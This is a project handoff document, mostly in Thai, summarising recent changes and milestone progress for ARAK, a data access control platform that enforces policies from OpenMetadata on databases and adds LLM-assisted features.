# HANDOFF — ARAK (Data Access Control Platform)

> อัปเดต: 2026-10-04 · ข้อ DB (**push ตามโหมดของ connection** — 1 connection มี 1 โหมด ใช้ทั้ง subscription และ data policy · role ลงเฉพาะ source ที่ตั้งเป็น Native source config · เปลี่ยนโหมดออกจาก Native ไม่ได้ระหว่างมี role · sweep ถอนคนออกจาก role ที่ค้างใต้โหมดอื่น · proxy ตอบเหมือนเดิมทุก query) · ข้อ DA (**subscription policy ลงไปเป็น role บน PostgreSQL** — tab *PostgreSQL roles* · Browse / Read · plan → apply → check · sweep ถอนอย่างเดียว · rollback · V47) · ข้อ CU (**หน้า *Where it runs* ก่อนฟอร์ม policy** — เลือก kind · connection · Query API / Secure view / Native config ก่อนเข้า Configure · `LOOKUP` เลือก column ด้วย tag ได้ · Credits เพิ่มชื่อผู้ร่วมพัฒนา) · ข้อ CT (**row filter อ่านค่าจาก mapping table (`LOOKUP`)** — department AA เห็น division A เพราะ mapping บอก · Join it into the query / Read the values first · query API เท่านั้น) · ข้อ CS (**grant เก็บ purpose (M31b slice 2a)** — ช่อง *What for* ในฟอร์ม Grant access · อายุ grant ไม่เกินระยะสูงสุดของ purpose · grant จากคำขอคง purpose ของคำขอ · tab Access แสดง / ค้นด้วย purpose ได้) · ข้อ CO (**อะไรนับเป็นข้อมูลอ่อนไหว (M31b slice 1)** — Settings → Purposes · รายการรวม / ยกเว้น · กติกา built-in · วัด coverage · ประวัติ · Off / **Warn** / Enforce ที่ Query และคำขอสิทธิ์ · review บอก purpose ที่ไม่อนุญาต) · ข้อ CN (**ทะเบียน Purpose (M31a · FR-21)** — Settings → Purposes · ฐานกฎหมาย PDPA · ข้อมูลอ่อนไหว · ระยะสิทธิ์สูงสุด · ปลดแทนลบ + ประวัติ · picker ใน policy / template / ฟอร์มขอ / Pre-authorize / Query / Simulator · server ตรวจทุกที่ · เหลือ M31b) · ข้อ CM (**เลือก column ให้ NokRak ร่าง description ได้** — ติ๊กทีละ column หรือทั้งหมดที่เห็น · ร่างใหม่ทับ column ที่มีคำอธิบายแล้วได้ในฟอร์ม · **roadmap M31–M36: object ที่ ARAK ควรเก็บเพิ่มนอกจาก policy** · **NokRak ไม่ตอบ "ไม่พบ" เมื่อตารางที่ตรงถูกกันสิทธิ์ — บอกจำนวนแทน** · คำอธิบายตัวอย่าง PO 49 column ขึ้น prod แล้ว) · ข้อ CL (**All rows** — ดาวน์โหลดทุกแถวเป็น CSV ผ่าน policy เดิม · audit บอกว่าเป็นการดาวน์โหลด · hover column บอก description · คลิกขวาไป Data Catalog · ลากขนาด editor ขึ้นลง / explanation ซ้ายขวา · FR-6.3) · ข้อ CK (**Find data** — NokRak หาตารางจากประโยคในหน้า Query · ตรวจสิทธิ์ก่อนโมเดลเห็นตาราง · อ่านได้ → เติม SQL · ขอได้ → ฟอร์มขอสิทธิ์ · M16) · ข้อ CJ.1 (ยิง explain-dashboard กับ LLM จริงแล้วผ่าน · ภาษาไทยแยก query กับ คำขอสิทธิ์) · ข้อ CJ (NokRak อธิบาย dashboard — panel **Ask NokRak** ใต้ key figures เลือกหัวข้อได้ · ชื่อคนเป็น `[P1]` ก่อนส่ง · M15 (ข) · M15 ครบ) · ข้อ CI (NokRak อธิบาย policy — ปุ่ม **Explain with NokRak** ในหน้า policy · M15 (ก)) · ข้อ CH (ปุ่ม **Query** ที่หัวหน้าตาราง สำหรับคนที่อ่านได้แล้ว — เปิดหน้า Query บน source ของตารางพร้อม SQL · FR-1.6d) · ข้อ CG (เปลี่ยนรหัสผ่านเอง — Profile → Password · หน้าบังคับเปลี่ยนเมื่อรหัสถูก admin ตั้ง · M2 / FR-2.2) · ข้อ CF (NokRak ตอบคำถามวิธีใช้ ARAK จากคู่มือที่แพ็กเข้า jar — `search_docs`) · ข้อ CE (สร้าง classification / tag ของ ARAK เองในหน้า Governance — provenance local · sync ไม่ทับ · ไม่เขียนกลับ OM) · ข้อ CD (Column description เขียนใน ARAK · NokRak ร่าง · แสดงใน ticket) · ข้อ CC (tab Access รับ list ยาว — แถบสรุป · chip · ค้น · แบ่งหน้า · กดดูรายละเอียดเต็ม) · ข้อ CB (NokRak ช่วยแก้ policy ที่มีอยู่ — คน review แล้วกด Save เอง) · ข้อ CA (ประวัติ policy · diff · rollback) · ข้อ BW (tag จาก OM ผ่าน webhook/poller ย้าย policy binding ทันที) · ข้อ BV (tab Access เฉพาะผู้ดูแล + Diagram แบบ canvas) · ข้อ BU (FR-1.7 local tag + demo group บน prod) · push ขึ้น origin/main แล้ว · repo https://github.com/sakanarm/ARAK (**public**)
>
> อ่านคู่กับ **[docs/DESIGN.md](docs/DESIGN.md)** — ไฟล์นั้นคือ requirement + feature catalogue + สถานะครบทุกข้อ
> ไฟล์นี้บอกเฉพาะ "ทำถึงไหน จะไปต่อยังไง อะไรที่ลองแล้วไม่เวิร์ค"
>
> **[docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — กติกาการชนกันของ policy ฉบับอธิบายผู้ใช้ (ภาษาไทย + ตัวอย่าง 6 เคส) ผู้ใช้ขอไว้สำหรับเอาไปอธิบายทีม · ฝั่ง spec อยู่ที่ [docs/policy-spec.md](docs/policy-spec.md)

---

## Goal

สร้างแพลตฟอร์ม Data Access Control แบบ Immuta/Denodo: ดึง metadata + governance object จาก **OpenMetadata 2.0.1** (integrate เฉยๆ **ไม่สร้าง catalog ใหม่**) → เขียน policy (subscription + data policy, global + local, RBAC/ABAC/rule/time เป็น predicate เดียว) → **บังคับใช้จริงที่ database** ครบ 3 โหมดใน Phase 1:

- **5.1.1** native source config (RLS / DDM / GRANT บน object เดิม)
- **5.1.2** secure view `*_secure` + REVOKE base table
- **5.2a** Query API ที่ rewrite SQL ตอน runtime

Phase 1 รองรับ SQL Server + PostgreSQL · identity หลักคือ Entra ID (local user ไว้เทสต์) · access-request workflow เลื่อน Phase 2
แผนเต็มอยู่ที่ `C:\Users\Sakan P\.claude\plans\requirement-access-optimized-dahl.md` (approved แล้ว)

---

## Current Progress

| Milestone | สถานะ |
|---|---|
| **M0 Foundation** | ✅ เสร็จ — Maven multi-module, Dropwizard 5, Vite+React+Tailwind shell, vendor `ui-core-components`, JSON Schema → Java/TS codegen, OM client จาก swagger ที่ pin ไว้, Flyway V1–V10, docker-compose, CI 4 jobs |
| **M1 OM Connector** | 🚧 ~97% — full crawl + governance + effective facet + FR-1.5 webhook/poller/reconcile (**webhook/poller re-resolve `policy_binding` แล้ว ข้อ BW**) · FR-1.7 local tag ใน ARAK เสร็จ (ข้อ BU) + catalog read API + Catalog UI + governance read API + Governance UI · **sync กับ OM จริงสำเร็จแล้ว** · เหลือ FR-1.6 (reconcile กับ JDBC จริง), FR-1.7 (local tag + push-back — **ผู้ใช้สั่ง read-only ตอนนี้**) |
| **M2 Identity** | 🚧 ~50% — local sign-in ใช้ได้ · schema `principal`/`principal_attribute`/`group_member`/`app_role_assignment` มีตั้งแต่ V2 · read API + หน้า People & attributes (**filter ตาม attribute + กดเข้าไปดูสมาชิกใน group ได้ที่ `/principals/:id`**) + **หน้า Application roles (`/settings/roles`) อ่านอย่างเดียว** เสร็จ · **เพิ่ม local account + assign/withdraw app role ได้จาก UI แล้ว (V10 + `IdentityAdminStore` + audit)** · attribute ของ local account เขียนผ่าน API ได้แล้ว (`POST`/`DELETE /v1/principals/{id}/attributes`) · **local group สร้างและจัดสมาชิกได้จาก UI แล้ว (V35, ข้อ BT)** · ยังไม่มีหน้าจอเปลี่ยน password (ทุก account ที่สร้างเป็น `must_change`) · ยังไม่มี Entra OIDC / Graph sync |
| **M3 Policy Engine** | 🚧 ~97% — engine **277 tests** (+10 รอบนี้ — `DataPolicyCompositionTest.MaskConflicts` ที่ทำให้เจอบั๊กการให้เครดิต policy ดูข้อ AH.3) (+101 รอบนี้ — `PolicyAlgebraTest` 34 ที่ assert **เซตของคนที่ผ่าน** ไม่ใช่ทีละคน + `ExpressionReferenceTest` ที่รันทุก example ในหน้า doc ผ่าน evaluator จริง) · เดิม **166 tests** (+10 รอบนี้ · **เจอบั๊กจริงสองตัวที่ grant โดนเต็มๆ ดูข้อ AE.1/AE.2**) (data policy 26 + subscription 45 เพิ่มรอบนี้ · เจอบั๊กจริง 2 ตัว ดูข้อ P) · persistence (`PolicyStore`) + `policy_binding` materializer + REST · `PolicyBindingMaterializerIT` 10 tests บน Postgres จริง · **decision cache (FR-5.5) ปิดแล้วรอบนี้ — 25 tests ดูข้อ AB** · เหลือ ANTLR grammar ของ `expr` (FR-3.2) ข้อเดียว |
| **M4 Policy Authoring UI** | ✅ **เสร็จ** — Policy list + Policy builder + readback + capability matrix + `/policies/:id` หน้าสรุปอ่านอย่างเดียว + panel Policies ในหน้า asset (FR-3.1.5) + View-as-user (FR-5.2, ข้อ Z) · **รอบนี้ปิดข้อสุดท้าย: impact analysis (FR-5.3) — `GET /v1/policies/{id}/impact` + panel “Who it changes things for” ดูข้อ AA** · **รอบนี้เพิ่มหน้า `/docs/expressions` — syntax reference ที่ backend ส่งมาจาก jar ของ engine กดจากช่อง expression ได้ พร้อม 11 policy ตัวอย่างจริงใน DB (ข้อ AF.3/AF.4)** |
| **M5 Secure View (5.1.2)** | 🚧 ~85% — **slice 1 จบ: `ViewCompiler` + golden-file test 2 dialect ดูข้อ AK.1** · **slice 2 จบ: `RowEntitlementMaintainer` (17 tests) — pure ทั้งคลาส · **refuse ไม่ใช่ skip** เมื่อ treatment/entitlement key ไม่ตรงกับ view ที่ติดตั้งอยู่ · ⚠️ **ไม่ต้องมี migration** (ตาราง `acl.*` อยู่ที่ source) — ดูข้อ AT** · `DecisionSql` + dialect ใช้ร่วมกับ 5.2 เหมือนเดิม · **slice 3 ครึ่งแรกจบ: `SecureViewApplier` — dry-run / apply / rollback ใน transaction เดียว · `StaleReviewException` เมื่อแถวเปลี่ยนหลังคนอนุมัติ · **11 tests บน Postgres จริง = ครั้งแรกที่ secure view ของ ARAK รันบนฐานข้อมูล** — ดูข้อ AU** · **slice 3 ครึ่งหลังจบรอบนี้: `SecureViewService` + `EnforcementResource` (`/api/v1/enforcement/secure-views` dry-run / apply / rollback) + V20 (`audit_enforcement` + ชื่อ view ที่ apply) + หน้า `/enforcement` + เมนูกลับมาแล้ว · apply ส่งแค่ `reviewId` · ทดสอบสดครบวงบน Postgres dev — ดูข้อ AW** · เหลือ slice 4 (MSSQL Testcontainers) · credential แยกสำหรับ DDL · cutover (FR-6.1.1) · `DbPrincipalProvisioner` |
| **M6 Push Config (5.1.1)** | 🚧 **~30% — subscription policy เป็น role บน PostgreSQL เสร็จ 2026-10-04 (ข้อ DA)** · **push ตามโหมดของ connection (ข้อ DB · 2026-10-04)** — role ลงเฉพาะ source ที่ตั้งเป็น Native source config · push ของ Data policy เพื่อนทำ · ส่วนที่เหลือ (RLS · column GRANT · `anon` · MSSQL) ยัง ⏸️ **ON HOLD — ผู้ใช้สั่ง 2026-09-24 *"M6 Push Config (5.1.1) Hold ไว้ก่อน"*** · ห้ามเริ่มจนกว่าผู้ใช้จะปลด · scope ที่ตกลงไว้ยังเหมือนเดิม: opt-in ต่อ source · ยิงเฉพาะ **policy object ที่แยกจาก table** (PG `CREATE POLICY` · MSSQL `CREATE SECURITY POLICY` · column GRANT) · **ตัด MSSQL DDM ออก** เพราะมัน `ALTER COLUMN` ทับนิยาม table — ดูข้อ AC.1 และ DESIGN FR-6.2a |
| **M7 Query API (5.2a)** | ✅ 100% — `POST /v1/query` + Query console · rewrite → RLS + mask + hidden column → execute → audit ครบ · พิสูจน์กับ Postgres จริงแล้วทั้ง allow / RLS / mask / refuse · direct-access detector (FR-6.3.1 ดูข้อ BX) · **result cache เสร็จ ดูข้อ BY** · **concurrency limit + cost guard เสร็จ ดูข้อ BZ** — FR-6.3 ครบทุกข้อ |
| **M7b Cross-mode consistency** | ⬜ — ต้องมี M5/M6 ก่อน |
| **M8 Audit + Ops** | 🚧 ~35% — **FR-7 ปิดครบวงรอบนี้ (grant ตรงระดับ table + auto-revoke + audit trail + หน้าจอ) ดูข้อ AD.1** · `audit_query` / `audit_decision` เขียนจริงแล้วและอ่านได้ · `audit_policy_change` เพิ่งถูกเขียนจริงในข้อ CA (V39 — ก่อนหน้านั้นตารางว่าง) · **`evaluation_ms` มีค่าแล้ว (ข้อ AE.5)** · **ยังไม่มี audit ของการ configure** (เปลี่ยน data source / OM settings ไม่ถูกบันทึกที่ไหนเลย) · ยังไม่มี compliance report / drift detector / auto-revoke / SIEM export |
| **M9 Access Request Management** | 🚧 **~75% — slice 2c จบรอบนี้ (ข้อ BD)** · slice 1 (ข้อ AX): `access_request` (V21) + ขอ / inbox / approve / reject / withdraw + audit · **slice 2a:** Access Request Workflow ออกแบบได้ต่อ scope (default องค์กร / service / database / schema / table) — หลาย step เรียงกัน, stage ใน step เดียวกันวิ่งพร้อมกัน, กติกา ALL / ANY / AT_LEAST n, Reject เลือกได้ต่อ stage (VETO / QUORUM / FIRST_RESPONSE), ผู้อนุมัติเป็น owner / steward / custodian / role / team / คน · admin ตอบแทนทุก stage ได้ · table ไม่มี owner → ตกไปหา platform admin **และขึ้นใน Inbox + กระดิ่งแล้ว** · Approve ≠ ให้สิทธิ์: APPROVED → IN_PROGRESS → COMPLETED (GRANT ไม่เกินวันที่ขอ / POLICY_UPDATED / POLICY_CREATED อ้างถึง policy เท่านั้น) หรือ Decline โดยผู้ configure · หน้า `/settings/workflows` (V23) · **slice 2b:** หน้า review ของคำขอ `GET /v1/access-requests/{id}/review` — ผู้ขอ (attribute / group / role / grant / ประวัติ) · grant จะเปิด column ไหน (visible / masked / hidden + sensitive) · row filter · risk LOW/MEDIUM/HIGH + เหตุผล · conflict (BLOCKER / WARNING / INFO) · suggestion (DECLINE / GRANT / UPDATE_POLICY / CREATE_POLICY_DRAFT — **draft เท่านั้น ไม่มีอะไร activate เอง**) · เช็ค policy ที่จะใช้ configure แบบอ่านอย่างเดียว · **GRANT ที่ policy ยังปฏิเสธ → 409** · IP ของคำขอ (V24) ใช้ตัดสิน ipCidr แต่ไม่เคยออกใน response · · **slice 2c:** Dashboard `GET /v1/access/grants/expiring` — ใครใกล้หมดสิทธิ์ใน table ไหน + **นับถอยหลังทีละวินาทีจากนาฬิกา server** (admin / author / auditor เห็นทุกแถว · owner เห็น table ของตัวเอง · requester เห็นของตัวเอง) · `GET /v1/access-requests/stats` — สถิติคำขอต่อ table (asked / open / granted / rejected / declined / withdrawn / คนขอ / median เวลาตอบ) นับจาก `access_request` ตรงๆ ไม่มีตารางนับแยก · การ์ด Home ใหม่ 2 ใบ · **ต่อไป:** recertification (access review รอบ 90 วัน) · **แนบไฟล์ในคำขอ (ผู้ใช้ขอ 2026-09-25 — เก็บไฟล์ไว้บน server ดูข้อ AP.11)** · ยังไม่ทำ: Automatic configuration (Roadmap) · recertification · break-glass · notification ทาง email/Teams |
| **M10 Access Control Dashboard** | ✅ **เสร็จรอบนี้ (ข้อ BE)** · **Query log** `GET /v1/audit/queries` + หน้า `/audit` — อ่านได้ตามหน้าที่: admin / author / auditor เห็นทุกแถว · owner เห็นแถวบน table ของตัวเอง (SQL ซ่อนถ้าแตะ table คนอื่น) · คนอื่นเห็นของตัวเอง · V25 เก็บ `asset_fqns` + `run_by` ต่อแถว · **Dashboard** `GET /v1/dashboard` + หน้า `/dashboard` (admin / author / auditor) — 5 KPI · Needs attention 10 แบบเรียงตามความเร่ง · Coverage ของ label ที่เลือก (default PII) · query ต่อวัน · เหตุที่ถูกปฏิเสธ · table sensitive ทีละตัว · ใครใกล้หมดสิทธิ์ (นับถอยหลัง) · table / คนที่ active สุด · grant · คำขอ · platform health · ไม่มี IP / SQL / ข้อความ error ในคำตอบ · เหลือ: export CSV/PDF · SIEM (FR-8.4) · drift จริงรอ DriftDetector |
| **M11 LLM Assist** | 🚧 **~60%** — ตารางนี้เคยเขียนว่า "ยังไม่เริ่ม" ซึ่งไม่จริงแล้ว · **per-user gateway ใช้งานได้จริง** — แต่ละคนใส่ base URL + key ของตัวเองในหน้า Settings และเลือกเองว่าจะเปิดใช้ไหม (`llm_user_setting.base_url` + `api_key_cipher` Fernet · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`) · `llm_provider.allow_personal` เป็น kill switch · ⚠️ `LlmResource.putUser` ตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled` — **ไม่มีใครเขียน gateway ของคนอื่นได้ ห้ามผ่อน** · ทดสอบสดผ่านแล้ว (21 models + completion ด้วย key ของ `analyst_a` เอง) · เหลือฟีเจอร์จริงสองตัว: **NL→SQL** และ **ร่าง policy** ที่ออกมาเป็น `DRAFT` เท่านั้น (FR-2.6 — LLM ไม่มีสิทธิ์ activate เอง) — ดูข้อ AO.8/AO.9 |
| **M12 Home ที่จัดเอง** | ✅ **เสร็จ — milestone ใหม่ ไม่อยู่ในแผนเดิม** · หน้าแรกจัดวางเองได้ต่อ account · 5 preset · 14 widget type (กราฟวาดเป็น SVG มือ ไม่มี chart library) · วาง **HTML / Note / Link / Video** ได้ · `V13__home_layout.sql` — ไม่มีแถว = default (ลบแถว = reset) · **default คนละใบตาม role**: governance ได้หน้าเดิม · Requestor ได้หน้า Search · ⚠️ **HTML ที่คนพิมพ์เอง = stored XSS** → `HomeLayoutValidator` ล้างทั้ง**ตอนเขียนและตอนอ่าน** **ห้ามมีทางเขียน `home_layout` ที่ไม่ผ่านตัวนี้** · **M12b persona เสร็จแล้ว** (`V19__home_role_layout.sql`) — admin จัดหน้าแรกให้แต่ละ Platform Role ได้ที่ `/settings/home` · resolve แบบ **personal → role (แรงสุดที่ถือ) → built-in** · **persona ไม่เคยทับหน้าที่คนจัดเอง** · ⚠️ เป็น**ที่แรกที่ markup ของคนหนึ่งถูก render ใน session ของอีกคนโดยตั้งใจ** → `@Secured("PLATFORM_ADMIN")` + ล้างผ่าน `HomeLayoutValidator` ทั้งเขียนและอ่าน — ดูข้อ AN และ AS |
| **M13 Request access จากจุดที่โดนปฏิเสธ** | ✅ **เสร็จรอบนี้ (ข้อ AX)** · refusal (403) ของ `POST /v1/query` พก `assetFqn` · `requestable` · `blockedBy` · `approvers[]` · `openRequestId` · หน้า Query ขึ้นกล่อง **"The owner can let you in"** → ฟอร์มขอสิทธิ์ (เหตุผล + จำนวนวัน + purpose + SQL ที่ติด) · ถ้า grant ช่วยไม่ได้ (DENY / ชั้นบนปฏิเสธ) บอกชื่อ policy ที่ขวางแทน ไม่ส่งไปให้ owner · **SQL Suggest** ในหน้า Query พร้อมป้าย *Readable* / *Request needed* ต่อ table · **ปุ่มเดียวกันบนหน้า asset ใน Catalog ✅ (ข้อ AY)** — มุมขวาบนของหัวหน้า asset · เปิด dialog ฟอร์มเดียวกัน · บอก *You can read this* / *Access requested* / กุญแจ + ชื่อ policy ที่ขวาง · ยังไม่ทำ: flag "ปฏิเสธแบบไม่บอกอะไรเลย" ต่อ policy |
| **M14 Public API + Swagger + Org Key** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · เปิด ARAK ให้ระบบอื่นเรียกได้: **Swagger UI + OpenAPI spec** ที่ generate จาก resource จริง · **สร้าง policy** และ **query ตามสิทธิ์ที่ตัวเองมี** ผ่าน API ได้ · auth ด้วย **Org Key ที่มีวันหมดอายุบังคับ** — scope ต่อ key, ผูกกับ principal ที่ระบุ, สิทธิ์ของ key ไม่เกินสิทธิ์ของเจ้าของ — ดูข้อ AP.2 |
| **M15 LLM อธิบาย policy และอธิบาย dashboard** | ✅ **(ก) ✅ 2026-09-28 (ข้อ CI)** · **(ข) ✅ 2026-09-28 (ข้อ CJ)** · **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ต่อยอดจาก M11 ที่ per-user gateway ใช้ได้จริงแล้ว · **(ก)** admin เปิด policy ตัวหนึ่งแล้วกด "อธิบายให้ฟัง" — LLM แปล selector + subject rule + row filter + mask ออกมาเป็นภาษาคน พร้อมบอกว่า **จะถูก policy ชั้นบนทับตรงไหน** · **(ข)** หน้า Dashboard (M10) กดที่กราฟแล้วให้ LLM อ่านตัวเลขให้ฟังว่ามันแปลว่าอะไรและควรไปดูอะไรต่อ — ⚠️ **ส่ง metadata + ตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริง และ LLM ยังไม่มีสิทธิ์ activate อะไรทั้งสิ้น** (FR-2.6) — ดูข้อ AP.3 |
| **M16 LLM ช่วยหา asset จากสิ่งที่อยากได้** | ✅ **2026-09-28 (ข้อ CK)** · **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ในหน้า Query เพิ่ม option ให้พิมพ์เป็นภาษาคนว่า *“อยากได้ข้อมูลผลิตภัณฑ์และราคา”* แล้ว LLM ไปค้นใน metadata (asset + column + description + tag + glossary term + domain) แล้วตอบกลับเป็น **ตาราง/คอลัมน์ที่น่าจะใช่ พร้อมเหตุผลว่าทำไม** · แต่ละตัวต้องบอกด้วยว่า **คุณ query ได้เลย** หรือ **ต้องไปขอสิทธิ์ก่อน** (ต่อปุ่มของ M13 ตรงนั้น) · ตัวที่ query ได้กดแล้วเติม SQL ร่างลงช่อง editor ให้เลย — ⚠️ **ค้นบน metadata เท่านั้น ห้ามส่งแถวข้อมูลจริงให้ LLM** และผลลัพธ์ต้อง **กรองด้วยสิทธิ์ของคนที่ถาม** ก่อนแสดง (ห้ามใช้ LLM เป็นช่องทางส่องว่ามีตารางอะไรอยู่บ้าง) — ดูข้อ AP.4 · **จุดเข้าที่สอง — หน้า Catalog** (ผู้ใช้ขอ 2026-09-26 *"Catalog ต้องสามารถให้ LLM มาช่วยในการค้นหาได้ด้วย"*): ช่องค้นหาของ Catalog มีโหมด "Ask" ที่พิมพ์เป็นภาษาคนได้ ใช้ backend ตัวเดียวกับหน้า Query · ผลลัพธ์เป็น asset ที่คนถามมองเห็นอยู่แล้วเท่านั้น พร้อมเหตุผล และปุ่มเปิดหน้า asset / ขอสิทธิ์ · ตัวแชทเต็มรูปแบบอยู่ใน **M28** |
| **M17 ประวัติย้อนหลังของ policy** | ✅ **เสร็จ (ข้อ CA)** — tab History · diff ตามความหมาย · rollback เป็นเวอร์ชันใหม่ + impact ก่อน + เหตุผลบังคับ · `audit_policy_change` เขียนทุกเวอร์ชัน (V39) · *ที่มาเดิม:* ผู้ใช้ขอ 2026-09-24 · ชิป *`v13 · active`* ที่เห็นบนหน้า policy มาจาก `policy.version` + `policy.lifecycle_state` · **ประวัติเก็บครบอยู่แล้วใน `policy_version`** (append-only ตั้งแต่ V3 — `PolicyStore` เขียนทุกครั้งก่อนแก้แถวจริง เก็บ `document` ทั้งใบ + `lifecycle_state` + `changed_by` + `change_reason` + `changed_at`) และ `GET /v1/policies/{id}/versions` ก็เปิดอยู่ **แต่ไม่มีหน้าจอไหนเรียกมันเลย** (`fetchPolicyVersions` ใน `api/policies.ts` เขียนไว้แล้วแต่ไม่มีใครใช้) · งานคือ: **แท็บ History** บนหน้า policy · **diff ระหว่างสองเวอร์ชัน** · **rollback** (เขียนเวอร์ชันใหม่ทับ ไม่ใช่ลบของเก่า ตาม FR-9.2) · และ **`audit_policy_change` ที่ยังไม่มีใครเขียนลงไปเลยสักแถว** — ดูข้อ AP.5 |
| **M18 รองรับ database type ใหม่ได้โดยไม่ต้องไล่แก้ 14 จุด** | 🚧 **~90% — MySQL เป็น engine ตัวที่ 3 แล้ว (ข้อ CP · 2026-09-30)**: ลงทะเบียน · import · Query proxy ครบ 4 capability บน MySQL 8.4 จริง · `supportsSchemas` มีคนอ่านแล้ว · พิสูจน์แล้วว่า class เดียว**ไม่พอ** — ยังต้องแตะ `DataSourceStore.Engine` · migration · `ProxyFunctions` · `LexicalGate` · `CostEstimate` (ดู CP.2) · เหลือบน MySQL: secure view · direct-access check · **slice 1 (ดูข้อ AR)** · `SourceEngine` registry + `SqlDialects` + `ProxyCapabilities` + `V18__source_engine.sql` + `GET /v1/sources/engines` · **switch ทั้ง 3 ตัวและ hardcode ฝั่ง frontend ทั้ง 6 ไฟล์หายไปแล้ว** · **proxy fail-closed แล้ว** — engine ที่ mask ไม่ได้ถูกปฏิเสธพร้อมบอกทางออก แทนที่จะคืน column แบบ plaintext · เหลือ: introspection quirk ต่อ engine (`supportsSchemas` ยังไม่มีใครอ่าน) · `engine_capability` ฝั่ง native ยังไม่มีคนอ่าน (รอ M6) · และ **เพิ่ม engine ตัวที่ 3 จริงเพื่อพิสูจน์ว่า class เดียวพอ** · เดิมคือ ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ของที่แพงออกแบบถูกแล้ว (`PolicyDecision` ไม่มี SQL · `SqlDialect` เป็น interface · `engine_capability` เป็น data) **แต่ชื่อ engine ถูก hardcode อยู่ 14 ที่** — `CHECK (engine IN (...))` 2 migration · switch ใน `JdbcTargets` + `SourceProbe` + `QueryService.dialectFor()` · frontend อีก 6 ไฟล์ · ลืมจุดเดียว**ไม่ error ตอน compile** แต่พังตอน runtime · งานคือ **`SourceEngine` registry ตัวเดียว** ที่ถือ url template + driver + dialect + probe + introspection quirk แล้วให้ทุกจุดอ่านจากมัน → เพิ่ม engine = **class 1 ตัว + capability rows** — ดูข้อ AP.7 |
| **M19 AI-Driven Anomalous Access Detection** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-25** · เรียนรู้ baseline การเข้าถึงข้อมูลของแต่ละคน (ปริมาณแถว · ช่วงเวลา · table ที่แตะ · อัตราโดนปฏิเสธ) แล้วจับพฤติกรรมที่ผิดไปจาก baseline เช่น ปกติดึงลูกค้าวันละ 10 แถว แต่วันหนึ่งดึง 5,000 แถวตอนตี 3 · **ตอบสนองได้ 3 ระดับ: แจ้งเตือน → ขอเหตุผลหรือให้ owner อนุมัติ → block แล้วพักสิทธิ์ใช้ query ไว้จนกว่า security จะตรวจ** · **block ทันทีทำได้เฉพาะเมื่อ query ผ่าน proxy (5.2)** · โหมด native (5.1.1 / 5.1.2) ทำได้แค่ตรวจย้อนหลังแล้วพักสิทธิ์ · v1 ใช้สถิติที่อธิบายได้ (median / MAD · histogram ตามชั่วโมง · table ที่ไม่เคยแตะ) ก่อน ML · LLM ใช้อธิบายเหตุผลเท่านั้น และเห็นแค่ตัวเลขสรุป ไม่เห็นข้อมูลจริง · ต้องเริ่มจาก shadow mode (แจ้งเตือนอย่างเดียว) · ต้องมี M10 (query log + `asset_fqns`) ก่อน · ดูข้อ AP.9 |
| **M20 MAC เต็มรูปแบบ — sensitivity level ที่เรียงลำดับได้** | ⬜ **Roadmap ใหม่ — ผู้ใช้ถาม 2026-09-25 ว่า DAC / MAC / RBAC / ABAC มีครบไหม** · DAC ✅ (owner ให้ grant เอง + อนุมัติคำขอ) · RBAC ✅ (`role` / `team` / `group` / `user` / `assetOwner`) · ABAC ✅ (`attributes` · `expression` · `time` · `context.ipCidr` / `purpose`) · **MAC ⚠️ ได้บางส่วน** — เขียนเป็น ORG policy แบบ DENY ได้ (local ผ่อนไม่ได้ และ owner ให้ grant ทะลุไม่ได้) แต่ `gte` เทียบ clearance ด้วยการเรียงตัวอักษร (`Comparisons.compare`) จึงใช้ได้กับชื่ออย่าง `L1 < L2` เท่านั้น · `Public < Internal < Confidential < Secret` เรียงผิด และระดับของ table ยังไม่ผูกกับ clearance อัตโนมัติ · ดูข้อ AP.10 |
| **M21 AI Data Access Control** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-25** · คุมว่า AI model / agent ดึงข้อมูลอะไรได้ ตามตัวตน สิทธิ์ และบริบทของ **user ที่ agent ทำงานแทน** · เทียบ 6 ข้อที่ผู้ใช้ส่งมา: runtime authorization ✅ (ฝั่ง SQL) · identity binding ⚠️ · row/column ✅ แต่ vector chunk ❌ · classification ⚠️ (ใช้ของ OM) · redaction ✅ ในผลลัพธ์ query แต่ ❌ ใน prompt / output ของ LLM · centralized enforcement ⚠️ · **ช่องว่างหลัก: ยังไม่มีช่องทางให้ agent เรียก ARAK ในนาม user** → agent registry + delegated token (RFC 8693) + ARAK MCP server + AI output guard + filter สำหรับ vector store · ต้องมี M14 ก่อน · ดูข้อ AP.12 |
| **M22 Encryption / Decryption ของข้อมูล** | ⬜ **Roadmap ใหม่ — ผู้ใช้ถาม 2026-09-25 ว่ามีระบบ Encryption / Decryption ไหม** · **ที่มีแล้วคุมแค่ความลับของระบบเอง ไม่ใช่ตัวข้อมูล:** credential ของ source และ LLM key ถูก seal ด้วย Fernet (`SecretBox` · `FERNET_KEY`) · MSSQL ต่อด้วย `encrypt=true` · mask `HASH` เป็น SHA-256 ทางเดียว ถอดกลับไม่ได้ · **ยังไม่มี:** ถอดรหัส column ที่ source เก็บแบบเข้ารหัสไว้ให้เฉพาะคนที่ policy อนุญาต · tokenization / FPE แบบย้อนกลับได้ · หมุนกุญแจ (key rotation) · Vault / Azure Key Vault ใช้จริง (ตอนนี้รับ reference แต่ resolve ไม่ได้) · TLS บังคับทุก source · เข้ารหัส SQL ที่เก็บใน audit · ดูข้อ AP.13 |
